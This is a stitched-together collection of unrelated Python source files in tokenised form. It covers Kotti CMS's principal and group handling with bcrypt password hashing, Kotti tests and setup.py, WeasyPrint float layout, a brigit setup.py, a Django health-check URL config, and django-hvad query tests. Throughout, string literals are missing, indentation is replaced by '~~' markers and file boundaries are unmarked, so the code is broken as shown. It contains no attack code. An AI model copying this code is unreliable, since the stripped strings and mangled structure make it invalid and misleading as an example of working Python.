_inherited . update ( i ) \n 
\n 
~~ return list ( groups ) , list ( _inherited ) \n 
\n 
\n 
~~ def set_groups ( name , context , groups_to_set = ( ) ) : \n 
~~~ """Set the list of groups for principal with given ``name`` and in\n    given ``context``.\n    """ \n 
\n 
from kotti . resources import LocalGroup \n 
\n 
name = unicode ( name ) \n 
context . local_groups = [ \n 
# keep groups for "other" principals \n 
lg for lg in context . local_groups \n 
if lg . principal_name != name \n 
] + [ \n 
# reset groups for given principal \n 
LocalGroup ( context , name , unicode ( group_name ) ) \n 
for group_name in groups_to_set \n 
] \n 
\n 
\n 
~~ def list_groups_callback ( name , request ) : \n 
~~~ """ List the groups for the principal identified by ``name``.  Consider\n    ``authz_context`` to support assigment of local roles to groups. """ \n 
if not is_user ( name ) : \n 
~~~ return None # Disallow logging in with groups \n 
~~ if name in get_principals ( ) : \n 
~~~ context = request . environ . get ( \n 
, getattr ( request , , None ) ) \n 
if context is None : \n 
\n 
~~~ from kotti . resources import get_root \n 
context = get_root ( request ) \n 
~~ return list_groups ( name , context ) \n 
\n 
\n 
~~ ~~ @ contextmanager \n 
def authz_context ( context , request ) : \n 
~~~ before = request . environ . pop ( , None ) \n 
request . environ [ ] = context \n 
try : \n 
~~~ yield \n 
~~ finally : \n 
~~~ del request . environ [ ] \n 
if before is not None : \n 
~~~ request . environ [ ] = before \n 
\n 
\n 
~~ ~~ ~~ @ contextmanager \n 
def request_method ( request , method ) : \n 
~~~ before = request . method \n 
request . method = method \n 
try : \n 
~~~ yield \n 
~~ finally : \n 
~~~ request . method = before \n 
\n 
\n 
~~ ~~ def view_permitted ( context , request , name = , method = ) : \n 
~~~ with authz_context ( context , request ) : \n 
~~~ with request_method ( request , method ) : \n 
~~~ return view_execution_permitted ( context , request , name ) \n 
\n 
\n 
~~ ~~ ~~ def principals_with_local_roles ( context , inherit = True ) : \n 
~~~ """Return a list of principal names that have local roles in the\n    context.\n    """ \n 
\n 
principals = set ( ) \n 
items = [ context ] \n 
\n 
if inherit : \n 
~~~ items = lineage ( context ) \n 
\n 
~~ for item in items : \n 
~~~ principals . update ( \n 
r . principal_name for r in item . local_groups \n 
if not r . principal_name . startswith ( ) \n 
) \n 
\n 
~~ return list ( principals ) \n 
\n 
\n 
~~ def map_principals_with_local_roles ( context ) : \n 
~~~ principals = get_principals ( ) \n 
value = [ ] \n 
for principal_name in principals_with_local_roles ( context ) : \n 
~~~ try : \n 
~~~ principal = principals [ principal_name ] \n 
~~ except KeyError : \n 
~~~ continue \n 
~~ else : \n 
~~~ all , inherited = list_groups_ext ( principal_name , context ) \n 
value . append ( ( principal , ( all , inherited ) ) ) \n 
~~ ~~ return sorted ( value , key = lambda t : t [ 0 ] . name ) \n 
\n 
\n 
~~ def is_user ( principal ) : \n 
~~~ if not isinstance ( principal , string_types ) : \n 
~~~ principal = principal . name \n 
~~ return not in principal \n 
\n 
\n 
~~ class Principals ( DictMixin ) : \n 
~~~ """Kotti\'s default principal database.\n\n    Look at \'AbstractPrincipals\' for documentation.\n\n    This is a default implementation that may be replaced by using the\n    \'kotti.principals\' settings variable.\n    """ \n 
factory = Principal \n 
\n 
@ classmethod \n 
def _principal_by_name ( cls , name ) : \n 
~~~ query = bakery ( lambda session : session . query ( cls . factory ) . filter ( \n 
cls . factory . name == bindparam ( ) ) ) \n 
return query ( DBSession ( ) ) . params ( name = name ) . one ( ) \n 
\n 
~~ @ request_cache ( lambda self , name : unicode ( name ) ) \n 
def __getitem__ ( self , name ) : \n 
~~~ name = unicode ( name ) \n 
# avoid calls to the DB for roles \n 
\n 
if name . startswith ( ) : \n 
~~~ raise KeyError ( name ) \n 
~~ try : \n 
~~~ return self . _principal_by_name ( name ) \n 
# return DBSession.query( \n 
#     self.factory).filter(self.factory.name == name).one() \n 
~~ except NoResultFound : \n 
~~~ raise KeyError ( name ) \n 
\n 
~~ ~~ def __setitem__ ( self , name , principal ) : \n 
~~~ name = unicode ( name ) \n 
if isinstance ( principal , dict ) : \n 
~~~ principal = self . factory ( ** principal ) \n 
~~ DBSession . add ( principal ) \n 
\n 
~~ def __delitem__ ( self , name ) : \n 
~~~ name = unicode ( name ) \n 
try : \n 
~~~ principal = self . _principal_by_name ( name ) \n 
DBSession . delete ( principal ) \n 
~~ except NoResultFound : \n 
~~~ raise KeyError ( name ) \n 
\n 
~~ ~~ def iterkeys ( self ) : \n 
~~~ for ( principal_name , ) in DBSession . query ( self . factory . name ) : \n 
~~~ yield principal_name \n 
\n 
~~ ~~ def keys ( self ) : \n 
~~~ return list ( self . iterkeys ( ) ) \n 
\n 
~~ def search ( self , match = , ** kwargs ) : \n 
~~~ """ Search the principal database.\n\n        :param match: ``any`` to return all principals matching any search\n                      param, ``all`` to return only principals matching\n                      all params\n        :type match: str\n\n        :param kwargs: Search conditions, e.g. ``name=\'bob\', active=True``.\n        :type kwargs: varying.\n\n        :result: SQLAlchemy query object\n        :rtype: :class:`sqlalchemy.orm.query.Query``\n        """ \n 
\n 
if not kwargs : \n 
~~~ return [ ] \n 
\n 
~~ filters = [ ] \n 
\n 
for key , value in kwargs . items ( ) : \n 
~~~ col = getattr ( self . factory , key ) \n 
if isinstance ( value , string_types ) and in value : \n 
~~~ value = value . replace ( , ) . lower ( ) \n 
filters . append ( func . lower ( col ) . like ( value ) ) \n 
~~ else : \n 
~~~ filters . append ( col == value ) \n 
\n 
~~ ~~ query = DBSession . query ( self . factory ) \n 
\n 
if match == : \n 
~~~ query = query . filter ( or_ ( * filters ) ) \n 
~~ elif match == : \n 
~~~ query = query . filter ( and_ ( * filters ) ) \n 
~~ else : \n 
~~~ raise ValueError ( \'match must be either "any" or "all".\' ) \n 
\n 
~~ return query \n 
\n 
~~ log_rounds = 10 \n 
\n 
def hash_password ( self , password , hashed = None ) : \n 
~~~ if hashed is None : \n 
~~~ hashed = bcrypt . gensalt ( self . log_rounds ) \n 
~~ return unicode ( \n 
bcrypt . hashpw ( password . encode ( ) , hashed . encode ( ) ) ) \n 
\n 
~~ def validate_password ( self , clear , hashed ) : \n 
~~~ try : \n 
~~~ return self . hash_password ( clear , hashed ) == hashed \n 
~~ except ValueError : \n 
~~~ return False \n 
\n 
\n 
~~ ~~ ~~ def principals_factory ( ) : \n 
~~~ return Principals ( ) \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ import json \n 
\n 
from mechanize . _mechanize import LinkNotFoundError \n 
from pytest import raises \n 
\n 
from kotti . testing import BASE_URL \n 
from kotti . testing import user \n 
from kotti . views . edit . upload import UploadView \n 
\n 
\n 
def test_upload_anonymous ( root , dummy_request , browser ) : \n 
\n 
~~~ view = UploadView ( root , dummy_request ) \n 
\n 
assert view . factories == [ ] \n 
\n 
link = browser . getLink \n 
\n 
browser . open ( . format ( BASE_URL ) ) \n 
\n 
# There must be no Upload Link for anonymous users \n 
with raises ( LinkNotFoundError ) : \n 
~~~ link ( ) . click ( ) \n 
\n 
# Upload views must redirect to login for anonymous users \n 
~~ browser . open ( . format ( BASE_URL ) ) \n 
assert browser . url . startswith ( . format ( BASE_URL ) ) \n 
\n 
browser . open ( . format ( BASE_URL ) ) \n 
assert browser . url . startswith ( . format ( BASE_URL ) ) \n 
\n 
\n 
~~ @ user ( ) \n 
def test_upload_authenticated_wo_mimetype ( root , dummy_request , browser ) : \n 
\n 
# cannot call content_types without mimetype \n 
~~~ with raises ( KeyError ) : \n 
~~~ browser . open ( . format ( BASE_URL ) ) \n 
\n 
\n 
~~ ~~ @ user ( ) \n 
def test_upload_authenticated_text ( root , dummy_request , browser ) : \n 
\n 
# get possible content types for text/plain \n 
~~~ browser . open ( . format ( BASE_URL ) ) \n 
j = json . loads ( browser . contents ) \n 
assert in j \n 
\n 
# only files are allowed \n 
types = j [ ] \n 
assert len ( types ) == 1 \n 
assert types [ 0 ] [ ] == \n 
~~ import os \n 
import sys \n 
\n 
from setuptools import setup \n 
from setuptools import find_packages \n 
\n 
here = os . path . abspath ( os . path . dirname ( __file__ ) ) \n 
try : \n 
~~~ README = open ( os . path . join ( here , ) ) . read ( ) \n 
AUTHORS = open ( os . path . join ( here , ) ) . read ( ) \n 
CHANGES = open ( os . path . join ( here , ) ) . read ( ) \n 
~~ except IOError : \n 
~~~ README = AUTHORS = CHANGES = \n 
\n 
~~ install_requires = [ \n 
, \n 
, # Fixes error when raising HTTPFound \n 
, # dependency of plone.scale \n 
, \n 
, \n 
, \n 
, \n 
, # >=2.0a1 to support Bootstrap 2 \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, # needed for image resizing capabilities \n 
, \n 
, # needed for ``request.has_permission`` \n 
, \n 
, \n 
, \n 
, # language and template path config includeme \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
tests_require = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, # needed for scaffolding tests \n 
, \n 
, \n 
] \n 
\n 
development_requires = [ ] \n 
\n 
docs_require = [ \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
if sys . version_info [ : 3 ] < ( 2 , 7 , 0 ) : \n 
~~~ install_requires . append ( ) \n 
\n 
~~ setup ( name = , \n 
version = , \n 
description = "A high-level, Pythonic web application framework based on Pyramid and SQLAlchemy.  It includes an extensible Content Management System called the Kotti CMS." long_description = . join ( [ README , AUTHORS , CHANGES ] ) , \n 
classifiers = [ \n 
"Programming Language :: Python" , \n 
"Programming Language :: Python :: 2.6" , \n 
"Programming Language :: Python :: 2.7" , \n 
"Framework :: Pylons" , \n 
"Topic :: Internet :: WWW/HTTP" , \n 
"Topic :: Internet :: WWW/HTTP :: Dynamic Content" , \n 
"Topic :: Internet :: WWW/HTTP :: WSGI :: Application" , \n 
"License :: Repoze Public License" , \n 
] , \n 
author = , \n 
author_email = , \n 
url = , \n 
keywords = , \n 
license = "BSD-derived (http://www.repoze.org/LICENSE.txt)" , \n 
packages = find_packages ( ) , \n 
include_package_data = True , \n 
zip_safe = False , \n 
install_requires = install_requires , \n 
tests_require = tests_require , \n 
dependency_links = [ ] , \n 
entry_points = """\\\n      [paste.app_factory]\n      main = kotti:main\n\n      [fanstatic.libraries]\n      kotti = kotti.fanstatic:lib_kotti\n\n      [console_scripts]\n      kotti-migrate = kotti.migrate:kotti_migrate_command\n      kotti-reset-workflow = kotti.workflow:reset_workflow_command\n      kotti-migrate-storage = kotti.filedepot:migrate_storages_command\n\n      [pytest11]\n      kotti = kotti.tests\n\n      [pyramid.scaffold]\n      kotti=kotti.scaffolds:KottiPackageTemplate\n      """ , \n 
extras_require = { \n 
: tests_require , \n 
: development_requires , \n 
: docs_require , \n 
} , \n 
) \n 
# coding: utf-8 \n 
"""\n    weasyprint.float\n    ----------------\n\n    :copyright: Copyright 2011-2014 Simon Sapin and contributors, see AUTHORS.\n    :license: BSD, see LICENSE for details.\n\n""" \n 
\n 
from __future__ import division , unicode_literals \n 
\n 
from . markers import list_marker_layout \n 
from . min_max import handle_min_max_width \n 
from . percentages import resolve_percentages , resolve_position_percentages \n 
from . preferred import shrink_to_fit \n 
from . tables import table_wrapper_width \n 
from . . formatting_structure import boxes \n 
\n 
\n 
@ handle_min_max_width \n 
def float_width ( box , context , containing_block ) : \n 
# Check that box.width is auto even if the caller does it too, because \n 
# the handle_min_max_width decorator can change the value \n 
~~~ if box . width == : \n 
~~~ box . width = shrink_to_fit ( context , box , containing_block . width ) \n 
\n 
\n 
~~ ~~ def float_layout ( context , box , containing_block , device_size , absolute_boxes , \n 
fixed_boxes ) : \n 
~~~ """Set the width and position of floating ``box``.""" \n 
# avoid a circular imports \n 
from . blocks import block_container_layout \n 
from . inlines import inline_replaced_box_width_height \n 
\n 
resolve_percentages ( box , ( containing_block . width , containing_block . height ) ) \n 
resolve_position_percentages ( \n 
box , ( containing_block . width , containing_block . height ) ) \n 
\n 
if box . margin_left == : \n 
~~~ box . margin_left = 0 \n 
~~ if box . margin_right == : \n 
~~~ box . margin_right = 0 \n 
~~ if box . margin_top == : \n 
~~~ box . margin_top = 0 \n 
~~ if box . margin_bottom == : \n 
~~~ box . margin_bottom = 0 \n 
\n 
~~ clearance = get_clearance ( context , box ) \n 
if clearance is not None : \n 
~~~ box . position_y += clearance \n 
\n 
~~ if isinstance ( box , boxes . BlockReplacedBox ) : \n 
~~~ inline_replaced_box_width_height ( box , device_size = None ) \n 
~~ elif box . width == : \n 
~~~ float_width ( box , context , containing_block ) \n 
\n 
~~ if box . is_table_wrapper : \n 
~~~ table_wrapper_width ( \n 
context , box , ( containing_block . width , containing_block . height ) ) \n 
\n 
~~ if isinstance ( box , boxes . BlockBox ) : \n 
~~~ context . create_block_formatting_context ( ) \n 
box , _ , _ , _ , _ = block_container_layout ( \n 
context , box , max_position_y = float ( ) , \n 
skip_stack = None , device_size = device_size , page_is_empty = False , \n 
absolute_boxes = absolute_boxes , fixed_boxes = fixed_boxes , \n 
adjoining_margins = None ) \n 
list_marker_layout ( context , box ) \n 
context . finish_block_formatting_context ( box ) \n 
~~ else : \n 
~~~ assert isinstance ( box , boxes . BlockReplacedBox ) \n 
\n 
~~ box = find_float_position ( context , box , containing_block ) \n 
\n 
context . excluded_shapes . append ( box ) \n 
\n 
return box \n 
\n 
\n 
~~ def find_float_position ( context , box , containing_block ) : \n 
~~~ """Get the right position of the float ``box``.""" \n 
# See http://www.w3.org/TR/CSS2/visuren.html#dis-pos-flo \n 
\n 
# Point 4 is already handled as box.position_y is set according to the \n 
# containing box top position, with collapsing margins handled \n 
\n 
# Points 5 and 6, box.position_y is set to the highest position_y possible \n 
if context . excluded_shapes : \n 
~~~ highest_y = context . excluded_shapes [ - 1 ] . position_y \n 
if box . position_y < highest_y : \n 
~~~ box . translate ( 0 , highest_y - box . position_y ) \n 
\n 
# Points 1 and 2 \n 
~~ ~~ position_x , position_y , available_width = avoid_collisions ( \n 
context , box , containing_block ) \n 
\n 
# Point 9 \n 
\n 
\n 
if box . style . float == : \n 
~~~ position_x += available_width - box . margin_width ( ) \n 
\n 
~~ box . translate ( position_x - box . position_x , position_y - box . position_y ) \n 
\n 
return box \n 
\n 
\n 
~~ def get_clearance ( context , box , collapsed_margin = 0 ) : \n 
~~~ """Return None if there is no clearance, otherwise the clearance value.""" \n 
clearance = None \n 
hypothetical_position = box . position_y + collapsed_margin \n 
# Hypothetical position is the position of the top border edge \n 
for excluded_shape in context . excluded_shapes : \n 
~~~ if box . style . clear in ( excluded_shape . style . float , ) : \n 
~~~ y , h = excluded_shape . position_y , excluded_shape . margin_height ( ) \n 
if hypothetical_position < y + h : \n 
~~~ clearance = max ( \n 
( clearance or 0 ) , y + h - hypothetical_position ) \n 
~~ ~~ ~~ return clearance \n 
\n 
\n 
~~ def avoid_collisions ( context , box , containing_block , outer = True ) : \n 
~~~ excluded_shapes = context . excluded_shapes \n 
position_y = box . position_y if outer else box . border_box_y ( ) \n 
\n 
box_width = box . margin_width ( ) if outer else box . border_width ( ) \n 
box_height = box . margin_height ( ) if outer else box . border_height ( ) \n 
\n 
if box . border_height ( ) == 0 and box . is_floated ( ) : \n 
~~~ return 0 , 0 , containing_block . width \n 
\n 
~~ while True : \n 
~~~ colliding_shapes = [ \n 
shape for shape in excluded_shapes \n 
if ( shape . position_y < position_y < \n 
shape . position_y + shape . margin_height ( ) ) or \n 
( shape . position_y < position_y + box_height < \n 
shape . position_y + shape . margin_height ( ) ) or \n 
( shape . position_y >= position_y and \n 
shape . position_y + shape . margin_height ( ) <= \n 
position_y + box_height ) \n 
] \n 
left_bounds = [ \n 
shape . position_x + shape . margin_width ( ) \n 
for shape in colliding_shapes \n 
if shape . style . float == ] \n 
right_bounds = [ \n 
shape . position_x \n 
for shape in colliding_shapes \n 
if shape . style . float == ] \n 
\n 
# Set the default maximum bounds \n 
max_left_bound = containing_block . content_box_x ( ) \n 
max_right_bound = containing_block . content_box_x ( ) + containing_block . width \n 
\n 
if not outer : \n 
~~~ max_left_bound += box . margin_left \n 
max_right_bound -= box . margin_right \n 
\n 
# Set the real maximum bounds according to sibling float elements \n 
~~ if left_bounds or right_bounds : \n 
~~~ if left_bounds : \n 
~~~ max_left_bound = max ( max ( left_bounds ) , max_left_bound ) \n 
~~ if right_bounds : \n 
~~~ max_right_bound = min ( min ( right_bounds ) , max_right_bound ) \n 
\n 
# Points 3, 7 and 8 \n 
~~ if box_width > max_right_bound - max_left_bound : \n 
# The box does not fit here \n 
~~~ new_positon_y = min ( \n 
shape . position_y + shape . margin_height ( ) \n 
for shape in colliding_shapes ) \n 
if new_positon_y > position_y : \n 
# We can find a solution with a higher position_y \n 
~~~ position_y = new_positon_y \n 
continue \n 
# No solution, we must put the box here \n 
~~ ~~ ~~ break \n 
\n 
~~ position_x = max_left_bound \n 
available_width = max_right_bound - max_left_bound \n 
\n 
if not outer : \n 
~~~ position_x -= box . margin_left \n 
position_y -= box . margin_top \n 
\n 
~~ return position_x , position_y , available_width \n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ """\nbriGit - Very simple git wrapper module\n""" \n 
\n 
from setuptools import setup , find_packages \n 
\n 
VERSION = \n 
\n 
\n 
options = dict ( \n 
name = "brigit" , \n 
version = VERSION , \n 
description = "Very simple git wrapper module" , \n 
long_description = __doc__ , \n 
author = "Florian Mounier - Kozea" , \n 
author_email = "florian.mounier@kozea.fr" , \n 
license = "BSD" , \n 
platforms = "Any" , \n 
install_requires = [ ] , \n 
provides = [ ] , \n 
packages = find_packages ( ) , \n 
use_2to3 = True , \n 
classifiers = [ \n 
"Development Status :: 5 - Production/Stable" , \n 
"Intended Audience :: Developers" , \n 
"License :: OSI Approved :: BSD License" , \n 
"Operating System :: OS Independent" , \n 
"Programming Language :: Python :: 2" , \n 
"Programming Language :: Python :: 3" , \n 
"Topic :: Software Development :: Libraries :: Python Modules" ] ) \n 
\n 
setup ( ** options ) \n 
from django . conf . urls import patterns , include , url \n 
\n 
import health_check \n 
health_check . autodiscover ( ) \n 
\n 
urlpatterns = patterns ( , \n 
url ( , , name = ) , \n 
) \n 
# -*- coding: utf-8 -*- \n 
import django \n 
from django . db import connection \n 
from django . db . models import Count \n 
from django . db . models . query_utils import Q \n 
from django . utils import translation \n 
from hvad . test_utils . data import NORMAL , STANDARD \n 
from hvad . test_utils . testcase import HvadTestCase , minimumDjangoVersion \n 
from hvad . test_utils . project . app . models import Normal , AggregateModel , Standard , SimpleRelated \n 
from hvad . test_utils . fixtures import NormalFixture , StandardFixture \n 
\n 
class FilterTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_simple_filter ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( shared_field__contains = ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
qs = Normal . objects . language ( ) . filter ( shared_field__contains = ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
\n 
~~ def test_translated_filter ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( translated_field__contains = ) \n 
self . assertEqual ( qs . count ( ) , self . normal_count ) \n 
obj1 , obj2 = qs \n 
self . assertEqual ( obj1 . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( obj1 . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( obj2 . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( obj2 . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
\n 
~~ def test_fallbacks_filter ( self ) : \n 
~~~ ( Normal . objects . language ( ) \n 
. filter ( shared_field = NORMAL [ 1 ] . shared_field ) \n 
. delete_translations ( ) ) \n 
with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) . fallbacks ( ) \n 
with self . assertNumQueries ( 2 ) : \n 
~~~ self . assertEqual ( qs . count ( ) , self . normal_count ) \n 
self . assertEqual ( len ( qs ) , self . normal_count ) \n 
~~ with self . assertNumQueries ( 0 ) : \n 
~~~ self . assertCountEqual ( ( obj . pk for obj in qs ) , tuple ( self . normal_id . values ( ) ) ) \n 
self . assertCountEqual ( ( obj . language_code for obj in qs ) , self . translations ) \n 
\n 
~~ ~~ ~~ def test_all_languages_filter ( self ) : \n 
~~~ with self . assertNumQueries ( 2 ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( shared_field__contains = ) \n 
self . assertEqual ( qs . count ( ) , self . normal_count * len ( self . translations ) ) \n 
self . assertCountEqual ( ( obj . shared_field for obj in qs ) , \n 
( NORMAL [ 1 ] . shared_field , \n 
NORMAL [ 2 ] . shared_field ) * 2 ) \n 
self . assertCountEqual ( ( obj . translated_field for obj in qs ) , \n 
( NORMAL [ 1 ] . translated_field [ ] , \n 
NORMAL [ 1 ] . translated_field [ ] , \n 
NORMAL [ 2 ] . translated_field [ ] , \n 
NORMAL [ 2 ] . translated_field [ ] ) ) \n 
\n 
~~ with self . assertNumQueries ( 2 ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( translated_field__contains = ) \n 
self . assertEqual ( qs . count ( ) , self . normal_count ) \n 
self . assertCountEqual ( ( obj . shared_field for obj in qs ) , \n 
( NORMAL [ 1 ] . shared_field , \n 
NORMAL [ 2 ] . shared_field ) ) \n 
self . assertCountEqual ( ( obj . translated_field for obj in qs ) , \n 
( NORMAL [ 1 ] . translated_field [ ] , \n 
NORMAL [ 2 ] . translated_field [ ] ) ) \n 
\n 
~~ with self . assertNumQueries ( 2 ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( translated_field__contains = ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
\n 
~~ ~~ def test_deferred_language_filter ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( translated_field__contains = ) \n 
~~ with translation . override ( ) : \n 
~~~ self . assertEqual ( qs . count ( ) , self . normal_count ) \n 
obj1 , obj2 = qs \n 
self . assertEqual ( obj1 . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( obj1 . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( obj2 . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( obj2 . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
\n 
\n 
~~ ~~ ~~ class ExtraTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_simple_extra ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . extra ( select = { : } ) \n 
self . assertEqual ( qs . count ( ) , self . normal_count ) \n 
self . assertEqual ( int ( qs [ 0 ] . test_extra ) , 4 ) \n 
\n 
\n 
~~ ~~ class QueryCachingTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def _try_all_cache_using_methods ( self , qs , length ) : \n 
~~~ with self . assertNumQueries ( 0 ) : \n 
~~~ x = 0 \n 
for obj in qs : x += 1 \n 
self . assertEqual ( x , length ) \n 
~~ with self . assertNumQueries ( 0 ) : \n 
~~~ qs [ 0 ] \n 
~~ with self . assertNumQueries ( 0 ) : \n 
~~~ self . assertEqual ( qs . exists ( ) , length != 0 ) \n 
~~ with self . assertNumQueries ( 0 ) : \n 
~~~ self . assertEqual ( qs . count ( ) , length ) \n 
~~ with self . assertNumQueries ( 0 ) : \n 
~~~ self . assertEqual ( len ( qs ) , length ) \n 
~~ with self . assertNumQueries ( 0 ) : \n 
~~~ self . assertEqual ( bool ( qs ) , length != 0 ) \n 
\n 
~~ ~~ def test_iter_caches ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ index = 0 \n 
qs = Normal . objects . language ( ) . filter ( pk = self . normal_id [ 1 ] ) \n 
for obj in qs : \n 
~~~ index += 1 \n 
~~ self . assertEqual ( index , 1 ) \n 
self . _try_all_cache_using_methods ( qs , 1 ) \n 
\n 
~~ ~~ def test_pickling_caches ( self ) : \n 
~~~ import pickle \n 
with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( pk = self . normal_id [ 1 ] ) \n 
pickle . dumps ( qs ) \n 
self . _try_all_cache_using_methods ( qs , 1 ) \n 
\n 
~~ ~~ def test_len_caches ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( pk = self . normal_id [ 1 ] ) \n 
self . assertEqual ( len ( qs ) , 1 ) \n 
self . _try_all_cache_using_methods ( qs , 1 ) \n 
\n 
~~ ~~ def test_bool_caches ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) . filter ( pk = self . normal_id [ 1 ] ) \n 
self . assertTrue ( qs ) \n 
self . _try_all_cache_using_methods ( qs , 1 ) \n 
\n 
\n 
~~ ~~ ~~ class IterTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_simple_iter ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ with self . assertNumQueries ( 1 ) : \n 
~~~ for index , obj in enumerate ( Normal . objects . language ( ) , 1 ) : \n 
~~~ self . assertEqual ( obj . shared_field , NORMAL [ index ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ index ] . translated_field [ ] ) \n 
~~ ~~ ~~ with translation . override ( ) : \n 
~~~ with self . assertNumQueries ( 1 ) : \n 
~~~ for index , obj in enumerate ( Normal . objects . language ( ) , 1 ) : \n 
~~~ self . assertEqual ( obj . shared_field , NORMAL [ index ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ index ] . translated_field [ ] ) \n 
\n 
~~ ~~ ~~ ~~ def test_iter_unique_reply ( self ) : \n 
# Make sure .all() only returns unique rows \n 
~~~ with translation . override ( ) : \n 
~~~ self . assertEqual ( len ( Normal . objects . all ( ) ) , len ( Normal . objects . untranslated ( ) ) ) \n 
\n 
~~ ~~ def test_iter_deferred_language ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) \n 
~~ with translation . override ( ) : \n 
~~~ for index , obj in enumerate ( qs , 1 ) : \n 
~~~ self . assertEqual ( obj . shared_field , NORMAL [ index ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ index ] . translated_field [ ] ) \n 
\n 
\n 
~~ ~~ ~~ ~~ class UpdateTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_update_shared ( self ) : \n 
~~~ NEW_SHARED = \n 
n1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
n2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
ja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
ja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
with self . assertNumQueries ( 1 if connection . features . update_can_self_select else 2 ) : \n 
~~~ Normal . objects . language ( ) . update ( shared_field = NEW_SHARED ) \n 
~~ new1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
new2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( new1 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( new1 . translated_field , n1 . translated_field ) \n 
self . assertEqual ( new2 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( new2 . translated_field , n2 . translated_field ) \n 
newja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
newja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( newja1 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( newja2 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( newja1 . translated_field , ja1 . translated_field ) \n 
self . assertEqual ( newja2 . translated_field , ja2 . translated_field ) \n 
\n 
~~ def test_update_translated ( self ) : \n 
~~~ NEW_TRANSLATED = \n 
n1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
n2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
ja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
ja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
with self . assertNumQueries ( 1 ) : \n 
~~~ Normal . objects . language ( ) . update ( translated_field = NEW_TRANSLATED ) \n 
~~ new1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
new2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( new1 . shared_field , n1 . shared_field ) \n 
self . assertEqual ( new2 . shared_field , n2 . shared_field ) \n 
self . assertEqual ( new1 . translated_field , NEW_TRANSLATED ) \n 
self . assertEqual ( new2 . translated_field , NEW_TRANSLATED ) \n 
\n 
newja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
newja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( newja1 . shared_field , ja1 . shared_field ) \n 
